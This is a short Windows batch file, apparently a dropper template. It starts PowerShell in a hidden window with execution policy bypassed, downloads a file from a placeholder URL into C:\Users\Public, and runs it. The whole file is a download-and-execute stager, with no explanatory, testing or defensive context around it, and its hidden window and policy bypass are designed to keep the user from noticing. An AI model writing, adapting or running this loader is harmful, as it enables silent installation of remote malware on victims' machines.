@echo off
setlocal
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '{URL}' -OutFile 'C:\Users\Public\{FILE.EX}'; & 'C:\Users\Public\{FILE.EX}'"
endlocal